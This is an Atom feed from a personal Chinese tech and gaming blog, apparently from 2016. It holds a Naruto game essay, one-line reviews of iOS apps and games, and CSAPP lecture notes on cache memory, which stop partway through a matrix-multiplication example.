<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[小土刀]]></title>
  <subtitle><![CDATA[Agony is my triumph]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://wdxtub.com/"/>
  <updated>2016-02-17T12:01:31.000Z</updated>
  <id>http://wdxtub.com/</id>
  
  <author>
    <name><![CDATA[wdxtub]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[Programming iOS9 翻译 9 - iPad Interface]]></title>
    <link href="http://wdxtub.com/2016/02/17/programming-ios9-translation-9/"/>
    <id>http://wdxtub.com/2016/02/17/programming-ios9-translation-9/</id>
    <published>2016-02-17T11:59:39.000Z</published>
    <updated>2016-02-17T12:01:31.000Z</updated>
    <content type="html"><![CDATA[<a id="more"></a>
<hr>
 公式 
]]></content>
    <summary type="html">
    <![CDATA[<a id="more"></a>
<hr>
 公式 
]]>
    </summary>
    
      <category term="iOS9" scheme="http://wdxtub.com/tags/iOS9/"/>
    
      <category term="iPad" scheme="http://wdxtub.com/tags/iPad/"/>
    
      <category term="学习" scheme="http://wdxtub.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="笔记" scheme="http://wdxtub.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="翻译" scheme="http://wdxtub.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Programming iOS9 翻译 8 - TableViews and Collection Views]]></title>
    <link href="http://wdxtub.com/2016/02/17/programming-ios9-translation-8/"/>
    <id>http://wdxtub.com/2016/02/17/programming-ios9-translation-8/</id>
    <published>2016-02-17T11:59:34.000Z</published>
    <updated>2016-02-17T12:00:52.000Z</updated>
    <content type="html"><![CDATA[<a id="more"></a>
<hr>
 公式 
]]></content>
    <summary type="html">
    <![CDATA[<a id="more"></a>
<hr>
 公式 
]]>
    </summary>
    
      <category term="iOS9" scheme="http://wdxtub.com/tags/iOS9/"/>
    
      <category term="学习" scheme="http://wdxtub.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="笔记" scheme="http://wdxtub.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="翻译" scheme="http://wdxtub.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="表格" scheme="http://wdxtub.com/tags/%E8%A1%A8%E6%A0%BC/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[【火影忍者究级风暴4】伊邪那美]]></title>
    <link href="http://wdxtub.com/2016/02/16/yi-xie-na-mei/"/>
    <id>http://wdxtub.com/2016/02/16/yi-xie-na-mei/</id>
    <published>2016-02-17T01:32:38.000Z</published>
    <updated>2016-02-17T03:46:36.000Z</updated>
    <content type="html"><![CDATA[<p>过去的我们是独孤又渴望爱情，让憎恨逐渐变强的小鬼。各自走上不同的道路，并且彼此对抗。渺小的我们总是互相争执，但是现在已经可以互相理解对方内心的痛楚。 —— 宇智波佐助</p>
<a id="more"></a>
<hr>
<p>当一切的一切最终落幕，所有的波澜壮阔都化为生活中的琐碎时，那一场场殊死战斗才真正有了意义。同样是游戏，同样是火影忍者，每一分每一秒都越发清晰地认识到，这是一群真正爱游戏，真正爱火影，真正爱这个世界并愿意为之付出努力的人倾尽全力想要给这个系列划上圆满的句号。比腾讯的坑钱手游不知道高到哪里去了。</p>
<p><img src="/images/naruto.jpg" alt="有些东西，是心里只有赚钱的人，永远做不出来的"></p>
<h2 id="u6E38_u620F_u90E8_u5206"><a href="#u6E38_u620F_u90E8_u5206" class="headerlink" title="游戏部分"></a>游戏部分</h2><p>游戏的战斗系统和前几作相比没有太大的区别，但是在忍术的释放和小队成员即时协作的操作上，利用 QTE 系统迸发出了极强的张力，加上场景和音乐的烘托，整个游戏过程酣畅淋漓，不会有可以为难玩家的数值与关卡设计，反而处处为玩家着想。就拿战斗失败的处理方式来对比，究极风暴4中会给出『坚强』与『不屈』两种选择，分别对应于防御和攻击的提高，表现形式是忍者始祖的『仙人指路』；但是到了腾讯这里，就是明明白白的『一元复活』，说真的，庸俗恶心。</p>
<p>可使用的角色林林总总有六十多个，从召唤兽到尾兽，从单挑到混战，还结合了射击与跑酷，视觉效果之华丽，气氛营造之到位，让人不禁感叹『游戏才是本体』，动画和漫画都成了配菜。</p>
<p>美中不足的是，可能因为容量与预算的限制，剧情部分大多是以静态图片加配音的方式展现的。虽然配音演员非常卖力，但是人物不动（或者只有微小的表情变化）总是让人觉得不够过瘾。但是毕竟不是每个游戏都能像《合金装备》那样大段大段塞入过场动画，这种表现形式也算是对于原著漫画与动画的致敬。</p>
<p>更难能可贵的是，根据关卡设计（主线分支而后汇合，某些章节分为鸣人线和佐助线，在决战时候两条剧情线汇合）和角色性格丰满的需要，游戏改动了部分剧情，使得整个剧情-战斗-剧情的循环非常合理，一气呵成，根本停不下来。</p>
<p>总而言之，即使是很久没有看火影的老粉丝（比如我），也能一口气把所有的剧情以互动的形式补完，还是最初的少年热血，还是最初的少年情怀，那份为了朋友为了羁绊而不断努力的心情，我相信每一个玩家都能真真切切地感受到。</p>
<p>没什么好说的，虽然有这样那样的不足，对我来说，这就是满分神作。</p>
<h2 id="u5267_u60C5_u90E8_u5206"><a href="#u5267_u60C5_u90E8_u5206" class="headerlink" title="剧情部分"></a>剧情部分</h2><p>那些陪伴我们成长的东西，往往因为太过『习以为常』而被忽略，却又在不经意间出现，让人充满力量。那些一直以来的牵绊，那些一代代的传承，总是会在最危急的时刻，成为最可靠的依赖。</p>
<p>神明为了安定，将世界分为阴阳两极，相反的两种元素互相做用，产生出森罗万象；相反的两种力量互相合作，就能得到真正的幸福。很多东西看似矛盾，其实反而是相互依存的（不由得想起『战争即和平，自由即奴役，无知即力量』）。</p>
<p>随着剧情的发展，很多从前以为是『坏人』的角色，都忽然洗白了，尤以大蛇丸和兜为代表，一个最叛逆在邪路上走的最远，在看见太多事情之后反而有了更加深刻的理解，坏就坏个彻底，好就好个通透；一个在『伊邪那美』的幻术中一次次重复终于超越了自我的局限，找回了自己。</p>
<p>剧情深入之后带来的另一个问题就是关于通往幸福的哲学讨论。一种说法认为『目的地既然不明确，又知道是条坎坷的路，就不用特地去走，走了也是增加同伴的牺牲；但是如果有明确目的地，又有捷径的话，任谁都会选择那条路』；另一种说法认为『重要的不是走捷径，而是走过坎坷道路的方法，到底哪条路是捷径，自己走过才知道。所谓火影，就是忍受痛楚，然后走在众人前方的领导者，成为火影没有捷径，想当上火影的人也绝不会逃避』。所谓正确的道路，所谓光明与黑暗，很多时候真的就只是一念之间。不同哲学路线带来了不同的世界观与方法论，也就是一切争斗的根源。</p>
<p>当然，我还学到了很多其他东西：</p>
<ul>
<li>关于伙伴的事，再痛苦我都能忍耐；可是心中没有伙伴，对我来说才是最痛苦的事情</li>
<li>人会因为思考、烦恼与挫折而成长，所谓幸福，应该是在那前方的东西</li>
<li>死亡并不是结束</li>
<li>不要用面具来掩盖自己</li>
<li>言语掩饰不了真心</li>
<li>回归到生活本身</li>
<li>别拘泥于无聊的自尊心</li>
<li>只要愿意，就看得见</li>
<li>朋友，就是看你迷茫受苦胡闹，心疼，没有办法丢下不管</li>
<li>爱不仅是努力帮 ta 遮风挡雨，更是相信 ta 自己的判断</li>
<li>人们像念珠一样串在一起的信念，会化成强大的力量</li>
<li>与信念相同的东西铭记在心，使彼此的生命联系在一起；放弃了信念，才是真正杀害了同伴</li>
</ul>
<p>不要再隐藏自己了！最后一个问题是：</p>
<blockquote>
<p>愿不愿意以一只眼睛的代价，让另一个人得到救赎？</p>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<p>过去的我们是独孤又渴望爱情，让憎恨逐渐变强的小鬼。各自走上不同的道路，并且彼此对抗。渺小的我们总是互相争执，但是现在已经可以互相理解对方内心的痛楚。 —— 宇智波佐助</p>]]>
    
    </summary>
    
      <category term="兄弟" scheme="http://wdxtub.com/tags/%E5%85%84%E5%BC%9F/"/>
    
      <category term="游戏" scheme="http://wdxtub.com/tags/%E6%B8%B8%E6%88%8F/"/>
    
      <category term="火影忍者" scheme="http://wdxtub.com/tags/%E7%81%AB%E5%BD%B1%E5%BF%8D%E8%80%85/"/>
    
      <category term="结局" scheme="http://wdxtub.com/tags/%E7%BB%93%E5%B1%80/"/>
    
      <category term="Game" scheme="http://wdxtub.com/categories/Game/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[iOS 应用简评]]></title>
    <link href="http://wdxtub.com/2016/02/16/ios-app-short-review/"/>
    <id>http://wdxtub.com/2016/02/16/ios-app-short-review/</id>
    <published>2016-02-16T15:45:49.000Z</published>
    <updated>2016-02-16T23:13:37.000Z</updated>
    <content type="html"><![CDATA[<p>这个系列主要是记录一下自己玩过的众多 iOS 应用，因为时间和篇幅所限，每个游戏可能只会用几句话简单评测，当然，某些我觉得值得单独拉出来评测的，还是会专门进行介绍的。</p>
<a id="more"></a>
<hr>
<h2 id="u5199_u5728_u524D_u9762"><a href="#u5199_u5728_u524D_u9762" class="headerlink" title="写在前面"></a>写在前面</h2><ul>
<li>入选标准纯主观</li>
<li>按自然顺序排列（就是瞎排，没有类别和时间顺序）</li>
<li>不会有截图，只有图标</li>
<li>评测标准纯主观，具体评测角度看心情</li>
<li>一分钱广告费没有拿，没有利益相关</li>
<li>部分内容可能因为记忆偏差或者应用更新而不一致，不要在意这些细节</li>
<li>基本都是中国区的应用，例外会特别标出</li>
<li>想到了再多加几条显得既随性又专业</li>
</ul>
<h2 id="16__u5E74_2__u6708_16__u65E5"><a href="#16__u5E74_2__u6708_16__u65E5" class="headerlink" title="16 年 2 月 16 日"></a>16 年 2 月 16 日</h2><p><img src="/images/14556379936188.jpg" alt=""></p>
<p>iDaily·每日环球视野</p>
<p>我基本就看看图，存存壁纸，但是现在我都用默认的壁纸了，也就不用了</p>
<hr>
<p><img src="/images/14556380070431.jpg" alt=""></p>
<p>SuperMemo</p>
<p>说白了就是记忆卡片，不过我始终静不下心背单词（或者其他），只是稍微尝试了一下，据说背后的算法很牛，不过没怎么体会到就是了。</p>
<hr>
<p><img src="/images/14556380356757.jpg" alt=""></p>
<p>Discovr</p>
<p>发现音乐的，找到不同歌手的联系，不过感觉对华语乐坛支持比较差，希望外国歌曲的盆友可以搞起</p>
<hr>
<p><img src="/images/14556380923184.jpg" alt=""></p>
<p>myUnit·Global Unit Converter</p>
<p>单位转换，这类应用基本就是拼界面了，这个因为是四叶草出品的，还是比较有保证的。</p>
<hr>
<p><img src="/images/14556381114390.jpg" alt=""></p>
<p>Forest: Stay focused</p>
<p>简单来说就是『封印』手机，我的感觉是不必有强迫症，感觉控制不住自己的时候用用就好。</p>
<hr>
<p><img src="/images/14556381202296.jpg" alt=""></p>
<p>Keep - 移动健身教练</p>
<p>美女帅哥很多，各个身材都比我好，但是人懒起来，就是不运动，你说怎么办！</p>
<hr>
<p><img src="/images/14556381707433.jpg" alt=""></p>
<p>53 Paper - Notes</p>
<p>非常文艺的画画记笔记软件，看这个介绍就知道跟我没啥关系了，因为我并不会画画。不过动画效果一流，看看还是不错的。</p>
<hr>
<p><img src="/images/14556381804646.jpg" alt=""></p>
<p>CalCube</p>
<p>立方体计算器，本质还是计算器呗，动画效果特别一些</p>
<hr>
<p><img src="/images/14556381980813.jpg" alt=""></p>
<p>NextDay</p>
<p>每天一张图一段话，文艺小清新，就是这个意思。</p>
<hr>
<p><img src="/images/14556382182817.jpg" alt=""></p>
<p>食色</p>
<p>一开始用得比较多，但是后来基本沦为修图软件，再后来图都懒得修了，晒吃总不能天天晒，那么不晒的时候我干嘛要看别人晒折磨自己。</p>
<hr>
<p><img src="/images/14556382269782.jpg" alt=""></p>
<p>The Great Photo App</p>
<p>手把手教你拍照，互动很不错，专业性也没有什么问题，就是更新太慢</p>
<hr>
<p><img src="/images/14556382681077.jpg" alt=""></p>
<p>图解电影</p>
<p>标题非常简明扼要，对我来说的好处就是，有些不敢看的恐怖片，可以看静态图过过瘾，毕竟没有那么可怕了</p>
<hr>
<p><img src="/images/14556383281179.jpg" alt=""></p>
<p>Polarr Photo Editor</p>
<p>总体感觉是功能很强大，但是上手难度太大，我一直就没怎么学会。</p>
<hr>
<p><img src="/images/14556383627121.jpg" alt=""></p>
<p>Light</p>
<p>网易出品的精选新闻，可以评论某一个段落或者图片什么的，打发时间。</p>
<hr>
<p><img src="/images/14556383931838.jpg" alt=""></p>
<p>DailyCost</p>
<p>之前自己在用的记账软件，界面比较清晰也挺好用，不过现在感觉还是刷卡的时候让信用卡账单自动记账比较省事儿。</p>
<hr>
<p><img src="/images/14556384034802.jpg" alt=""></p>
<p>Calculator ‘3’</p>
<p>这年头计算器花样太多，不过我最常用的还是原生自带的，这个功能挺强大的，感兴趣可以试一试。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这个系列主要是记录一下自己玩过的众多 iOS 应用，因为时间和篇幅所限，每个游戏可能只会用几句话简单评测，当然，某些我觉得值得单独拉出来评测的，还是会专门进行介绍的。</p>]]>
    
    </summary>
    
      <category term="iOS" scheme="http://wdxtub.com/tags/iOS/"/>
    
      <category term="应用" scheme="http://wdxtub.com/tags/%E5%BA%94%E7%94%A8/"/>
    
      <category term="评测" scheme="http://wdxtub.com/tags/%E8%AF%84%E6%B5%8B/"/>
    
      <category term="Game" scheme="http://wdxtub.com/categories/Game/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[iOS 游戏简评]]></title>
    <link href="http://wdxtub.com/2016/02/16/ios-game-short-review/"/>
    <id>http://wdxtub.com/2016/02/16/ios-game-short-review/</id>
    <published>2016-02-16T15:34:25.000Z</published>
    <updated>2016-02-16T23:50:14.000Z</updated>
    <content type="html"><![CDATA[<p>这个系列主要是记录一下自己玩过的众多 iOS 游戏，因为时间和篇幅所限，每个游戏可能只会用几句话简单评测，当然，某些我觉得值得单独拉出来评测的，还是会专门进行介绍的。</p>
<a id="more"></a>
<hr>
<h2 id="u5199_u5728_u524D_u9762"><a href="#u5199_u5728_u524D_u9762" class="headerlink" title="写在前面"></a>写在前面</h2><ul>
<li>入选标准纯主观</li>
<li>按自然顺序排列（就是瞎排，没有类别和时间顺序）</li>
<li>不会有截图，只有图标</li>
<li>评测标准纯主观，具体评测角度看心情</li>
<li>一分钱广告费没有拿，没有利益相关</li>
<li>部分内容可能因为记忆偏差或者游戏更新而不一致，不要在意这些细节</li>
<li>基本都是中国区的游戏，例外会特别标出</li>
<li>想到了再多加几条显得既随性又专业</li>
</ul>
<h2 id="16__u5E74_2__u6708_16__u65E5"><a href="#16__u5E74_2__u6708_16__u65E5" class="headerlink" title="16 年 2 月 16 日"></a>16 年 2 月 16 日</h2><p><img src="/images/14556380188112.jpg" alt=""></p>
<p>3D Badminton</p>
<p>整体来说手感不错，手指当球拍，划不同区域不同力度就相当于跑位和击球方式了，不过因为我对羽毛球真的是略懂，所以觉得其实和其他球类游戏差别不大，估计改改参数就可以做成乒乓球排球网球，反正只要是有网的竞技体育就行。</p>
<hr>
<p><img src="/images/14556380616375.jpg" alt=""></p>
<p>Flight Control</p>
<p>经典的上古级游戏，记得当时我还玩得很上瘾，根本停不下来，不过后面因为玩法变化太小玩多了难免有那么一个瞬间觉得『啊这有什么好玩啊』，然后就不继续玩了</p>
<hr>
<p><img src="/images/14556380714213.jpg" alt=""></p>
<p>A Dark Room</p>
<p>恐怖游戏一直不是我的菜，实在是联想能力太强，晚上果断睡不着觉，不过整体氛围还是不错的。</p>
<hr>
<p><img src="/images/14556380782615.jpg" alt=""></p>
<p>Broken Sword 2</p>
<p>也是比较早的游戏了，动画片画风略微有点违和，不过习惯了之后感觉还是挺不错的，标准的剧情解密，谜题设计得还算不错，值得玩一玩。</p>
<hr>
<p><img src="/images/14556380855019.jpg" alt=""></p>
<p>Flappy Bird</p>
<p>洗脑游戏，一句话就可以说清楚玩的感受『看起来这么蠢的游戏我竟然只能得个位数分数，这不科学我不服』</p>
<hr>
<p><img src="/images/14556381036144.jpg" alt=""></p>
<p>OPUS: The Day We Found Earth</p>
<p>非常文艺的游戏，就是孤独的小机器人在茫茫宇宙中找寻适合人类居住的星球，需要一定情怀和耐心。</p>
<hr>
<p><img src="/images/14556381272633.jpg" alt=""></p>
<p>Burn it Down</p>
<p>一开始玩感觉还不错，后面进入恐怖模式了，我就又不敢玩了，横版过关。</p>
<hr>
<p><img src="/images/14556381549828.jpg" alt=""></p>
<p>ZENFORMS: Protectors</p>
<p>既然任天堂不在手机上出宠物小精灵，那么肯定就会有后来者满足大家愿望，这个就是了。</p>
<hr>
<p><img src="/images/14556381633213.jpg" alt=""></p>
<p>Skyward</p>
<p>看图标就知道，纪念碑谷之后这类画风的游戏就流行起来了，但是玩法和纪念碑谷是万万不同的。</p>
<hr>
<p><img src="/images/14556381906331.jpg" alt=""></p>
<p>Turbo Dismount</p>
<p>物理学自虐游戏，这个是第二作，花样在马路上作死，发泄起来还是很爽的。</p>
<hr>
<p><img src="/images/14556382087935.jpg" alt=""></p>
<p>Tap ‘n Slash</p>
<p>非常简单粗暴的小游戏，沿着对角线走走砍砍，熟能生巧，不过像素风格还是比较有趣的</p>
<hr>
<p><img src="/images/14556382361373.jpg" alt=""></p>
<p>Towers Infinite</p>
<p>从前还是在索爱上玩过的盖楼，现在出了高清无尽版，不过还是怀旧成分比较多。</p>
<hr>
<p><img src="/images/14556382432271.jpg" alt=""></p>
<p>Rayman Fiesta Run</p>
<p>雷曼系列跑酷，质量一流，收集癖慎玩，很容易发生因为没有收集完在一关死循环的情况。</p>
<hr>
<p><img src="/images/14556382529865.jpg" alt=""></p>
<p>The Sandbo - Build&amp; Create</p>
<p>沙盒造物主系列，像素风，我个人对这个类型游戏比较一般。</p>
<hr>
<p><img src="/images/14556382612517.jpg" alt=""></p>
<p>rop</p>
<p>切完糖果可以切绳子！基本来说就是基于物理规则的益智游戏</p>
<hr>
<p><img src="/images/14556382759883.jpg" alt=""></p>
<p>Super Hexagon</p>
<p>非常考验反应力，而且多边形大色块很容易让人意乱神迷，洗脑游戏 </p>
<hr>
<p><img src="/images/14556382823039.jpg" alt=""></p>
<p>FOTONICA</p>
<p>第一人称线条型跑酷，超级狂拽酷炫，音乐也是亮点</p>
<p><img src="/images/14556382896123.jpg" alt=""></p>
<p>Call of Mini: Dino Hunter</p>
<p>打完僵尸打恐龙，其实差不多是一个意思，喜欢左右摇杆射击可以试试看。</p>
<hr>
<p><img src="/images/14556382987408.jpg" alt=""></p>
<p>Angry Birds Star Wars II</p>
<p>愤怒小鸟主题游戏第 N 波，我向来不是特别感冒</p>
<hr>
<p><img src="/images/14556383193105.jpg" alt=""></p>
<p>Assassin’s Creed Pirates</p>
<p>刺客信条海战系列，总体来说还原得不错，不过从大航海时代我就是海战苦手，过过过。</p>
<hr>
<p><img src="/images/14556383343499.jpg" alt=""></p>
<p>OLO game</p>
<p>画面清新玩法简单非常适合情侣虐狗的游戏，就是这样。</p>
<hr>
<p><img src="/images/14556383492141.jpg" alt=""></p>
<p>Doodle Jump</p>
<p>也是上古游戏列表中的知名一员，重力感应跳跳跳，玩久了很容易无聊。</p>
<hr>
<p><img src="/images/14556383552948.jpg" alt=""></p>
<p>Eternity Warriors 3</p>
<p>可能是 glu 最后一款这样的大作了？只能说在手机上我玩不来这个类型游戏，太累。</p>
<hr>
<p><img src="/images/14556383711674.jpg" alt=""></p>
<p>Assassin’s Creed Recollection</p>
<p>非常有创意的卡牌对战游戏，我觉得和炉石传说相比一点都不逊色，而且刺客明显更酷嘛。</p>
<hr>
<p><img src="/images/14556383809420.jpg" alt=""></p>
<p>Edge</p>
<p>又是一个画面洗脑的游戏，看久了不知道为啥就会感觉不大舒服，多边形益智类，你懂的。</p>
<hr>
<p><img src="/images/14556383870555.jpg" alt=""></p>
<p>Skiing Yeti Mountain</p>
<p>虽然不知道是什么山，但是这个山上出了很多人命是一定的，手感真的非常不错，滑雪控不要错过</p>
<hr>
<p><img src="/images/14556384107682.jpg" alt=""></p>
<p>Radiation Island</p>
<p>辐射岛，可能是最近玩过的手机平台上最 hard core 的游戏了，不过需要很多心思，没啥时间深入感受</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这个系列主要是记录一下自己玩过的众多 iOS 游戏，因为时间和篇幅所限，每个游戏可能只会用几句话简单评测，当然，某些我觉得值得单独拉出来评测的，还是会专门进行介绍的。</p>]]>
    
    </summary>
    
      <category term="iOS" scheme="http://wdxtub.com/tags/iOS/"/>
    
      <category term="游戏" scheme="http://wdxtub.com/tags/%E6%B8%B8%E6%88%8F/"/>
    
      <category term="评测" scheme="http://wdxtub.com/tags/%E8%AF%84%E6%B5%8B/"/>
    
      <category term="Game" scheme="http://wdxtub.com/categories/Game/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[深入理解计算机系统 第 12 课 Cache Memories]]></title>
    <link href="http://wdxtub.com/2016/02/15/csapp-12/"/>
    <id>http://wdxtub.com/2016/02/15/csapp-12/</id>
    <published>2016-02-15T15:15:18.000Z</published>
    <updated>2016-02-16T15:11:46.000Z</updated>
    <content type="html"><![CDATA[<p>上一讲我们了解了存储的相关知识，这节课我们来更加深入研究一下 cache memory 的知识。</p>
<a id="more"></a>
<hr>
<p>Cache memory 是由硬件自动管理的 SRAM 内存，CPU 会首先从这里找数据，其所处的位置如下：</p>
<p><img src="/images/14555689621035.jpg" alt=""></p>
<p><strong>General Cache Organization(S, E, B)</strong></p>
<p>通常来说，是按照如下图所示的方式来组织的，一定要注意 S/E/B 具体在说什么：</p>
<p><img src="/images/14555690389309.jpg" alt=""></p>
<p>实际上可以理解为三种层级关系，对应不同的索引，这样分层的好处在于，通过层级关系简化搜索需要的时间，并且和字节的排布也是一一对应的（之后介绍缓存的时候就体现得更加明显）。</p>
<h2 id="u8BFB_u5165"><a href="#u8BFB_u5165" class="headerlink" title="读入"></a>读入</h2><p><img src="/images/14556253748808.jpg" alt=""></p>
<p>具体在从缓存中读取一个地址时，首先我们通过 set index 确定要在哪个 set 中寻找，确定后利用 tag 和同一个 set 中的每个 line 进行比对，找到 tag 相同的那个 line，最后再根据 block offset 确定要从 line 的哪个位置读起（这里的而 line 和 block 是一个意思）。</p>
<p>当 E=1 时，也就是每个 set 只有 1 个 line 的时候，称之为直接映射缓存(Direct Mapped Cache)。</p>
<p><img src="/images/14556267189507.jpg" alt=""></p>
<p>这种情况下，因为每个 set 对应 1 个 line，反过来看，1 个 line 就需要一个 set，所以 set index 的位数就会较多（和之后的多路映射对比）。具体的检索过程就是先通过 set index 确定哪个 set，然后看是否 valid，然后比较那个 set 里唯一 line 的 tag 和地址的 t bits 是否一致，就可以确定是否缓存命中。</p>
<p><img src="/images/14556274155804.jpg" alt=""></p>
<p>命中之后根据 block offset 确定偏移量，因为需要读入一个 int，所以会读入 4 5 6 7 这四个字节（假设缓存是 8 个字节）。如果 tag 不匹配的话，这行会被扔掉并放新的数据进来。</p>
<p>这里举一个具体的例子</p>
<p><img src="/images/14556275938967.jpg" alt=""></p>
<p>缓存的大小如图所示，对应就是有 4 个 set，所以需要 2 位的 set index，所以进行读入的时候，会根据中间两位来确定在哪个 set 中查找，其中 8 和 0，因为中间两位相同，会产生冲突，导致连续 miss，这个问题可以用多路映射来解决。</p>
<p>当 E 大于 1 时，也就是每个 set 有 E 个 line 的时候，称之为 E-way Set Associative Cache。这里用 E = 2 来做例子：</p>
<p><img src="/images/14556282750323.jpg" alt=""></p>
<p>跟前面所说的一致，这里每个 set 有两个 line，所以就没有那么多 set，也就是说说 set index 可以少一位（之后的例子可以看到）</p>
<p><img src="/images/14556285710342.jpg" alt=""></p>
<p>再简述一下整个过程，先从 set index 确定那个 set，然后看 valid 位，接着利用 t bits 分别和每个 line 的 tag 进行比较，如果匹配则命中，那么返回 4 5 位置的数据，如果不匹配，就需要替换，可以随机替换，也可以用 least recently used(LRU) 来进行替换。下面是一个具体的例子：</p>
<p><img src="/images/14556295742803.jpg" alt=""></p>
<p>可以看到因为每个 set 有 2 个 line，所以只有 2 个 set，set index 也只需要 1 位了，这个情况下即使 8 和 0 的 set index 一致，因为一个 set 可以容纳两个数据，所以最后一次访问 0，就不会 miss 了。</p>
<h2 id="u5199_u5165"><a href="#u5199_u5165" class="headerlink" title="写入"></a>写入</h2><p>在整个 memory hierarchy 中，不同的层级可能会存放同一个数据的不同拷贝（如 L1, L2, L3, 主内存, 硬盘）。如果发生写入命中的时候（也就是要写入的地址在缓存中有），有两种策略：</p>
<ul>
<li>Write-through: 命中后更新缓存，同时写入到内存中</li>
<li>Write-back: 直到这个缓存需要被指环出去，才写入到内存中（需要额外的 dirty bit 来表示缓存中的数据是否和内存中相同，因为可能在其他的时候内存中对应地址的数据已经更新，那么重复写入就会导致原有数据丢失）</li>
</ul>
<p>在写入 miss 的时候，同样有两种方式：</p>
<ul>
<li>Write-allocate: 载入到缓存中，并更新缓存（如果之后还需要对其操作，这个方式就比较好）</li>
<li>No-write-allocate: 直接写入到内存中，不载入到缓存 </li>
</ul>
<p>这四种策略通常的搭配是：</p>
<ul>
<li>Write-through + No-wirte-allocate</li>
<li>Write-back + Write-allocate</li>
</ul>
<p>其中第一种可以保证绝对的数据一致性，第二种效率会比较高（通常情况下）。</p>
<h2 id="u5B9E_u4F8B_u5B66_u4E60_uFF1AIntel_Core_i7"><a href="#u5B9E_u4F8B_u5B66_u4E60_uFF1AIntel_Core_i7" class="headerlink" title="实例学习：Intel Core i7"></a>实例学习：Intel Core i7</h2><p>Intel Core i7 的 cache hierarchy 如下图所示：</p>
<p><img src="/images/14556301866362.jpg" alt=""></p>
<p>我们通常用如下的指标来评价缓存的性能：</p>
<ul>
<li>Miss Rate<ul>
<li>1 - hit rate</li>
<li>对于 L1 来说一般 3-10%</li>
<li>对于 L2 来说很小 &lt; 1%</li>
<li>也就是说大部分时间堆数据的访问都是极快的</li>
</ul>
</li>
<li>Hit Time<ul>
<li>把 1 个 line 的缓存传输给处理器所用的时间，包括判断其是否在缓存中这个过程</li>
<li>对于 L1 来说一般 4 个时钟周期</li>
<li>对于 L2 来说一般 10 个时钟周期</li>
</ul>
</li>
<li>Miss Penalty<ul>
<li>因为 miss 所需要花费的额外时间</li>
<li>一般来说需要 50-200 个时钟周期（因为要读内存，而且由于处理器速度越来越快，这个时间还在增长）</li>
</ul>
</li>
</ul>
<p>从前面的数据中，我们可以看出，hit 和 miss 所需要的时间是天壤之别（只看 L1 和主存的话，可能差 100 倍）。</p>
<p>还有一个比较有意思的现象是，99% 的命中率，是 97% 的命中率的性能的两倍。举个例子，假设缓存命中时需要 1 个周期，而 miss penalty 是 100 个周期，那么</p>
<ul>
<li>97% hits: 1 cycle + 0.03 x 100 cycles = 4 cycles</li>
<li>99% hits: 1 cycle + 0.01 x 100 cycles = 2 cycles</li>
</ul>
<p>这也是为什么我们用 miss rate 而不是 hit rate，因为更能体现出倍数的关系。</p>
<h2 id="Memory_mountain"><a href="#Memory_mountain" class="headerlink" title="Memory mountain"></a>Memory mountain</h2><p>我们用每秒从内存中读入的字节数目来衡量内存的性能（单位 MB/s），根据 spatial 和 temporal locality 的特性，我们可以画出一幅立体的表现性能走向的图，具体用的测试代码为：</p>
<p><img src="/images/14556314610621.jpg" alt=""></p>
<p>可以得到这么一幅图</p>
<p><img src="/images/14556314890158.jpg" alt=""></p>
<p>注意，这是根据 Core i7 得出来的图，不同的处理器可能因为不同的设计和架构而有所区别，但是可以通过不同的颜色和层次，看出不同 size 和 stride 对性能的影响。山脚是我们应该尽量避免的，山顶是我们力求达到的，也就是说，尽量一次访问一个 stride，一次读入的数据大小也不宜太大，最好和 L1 缓存数值上吻合。</p>
<h2 id="u77E9_u9635_u76F8_u4E58"><a href="#u77E9_u9635_u76F8_u4E58" class="headerlink" title="矩阵相乘"></a>矩阵相乘</h2><p>矩阵相乘是学习缓存非常好的例子，这里给出一些条件：</p>
<ul>
<li>两个 N x N 的矩阵相乘，N 非常大，所以可以认为 1/N 等于 0</li>
<li>矩阵的每个元素是 double，也就是 8 个字节</li>
<li>一共需要 $O(n^3)$ 次操作</li>
<li>源矩阵的每个元素需要被读入 N 次</li>
<li>目标矩阵的每个元素要被写入 N 次（相加），但是可以在寄存器中完成</li>
<li>缓存中每 1 个 line 的大小是 32 个字节（足够放下 4 个 double）</li>
<li>缓存可能至多能容纳矩阵的一行（甚至只能是一行的一部分）</li>
</ul>
<h3 id="u66F4_u6539_u5FAA_u73AF_u987A_u5E8F_u63D0_u9AD8_spatial_locality"><a href="#u66F4_u6539_u5FAA_u73AF_u987A_u5E8F_u63D0_u9AD8_spatial_locality" class="headerlink" title="更改循环顺序提高 spatial locality"></a>更改循环顺序提高 spatial locality</h3><p>一种算法是这样的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ijk */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">        sum = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            sum += a[i][k] * b[k][j];</span><br><span class="line">        c[i][j] = sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察里面的循环，大概的访问模式是这样的：</p>
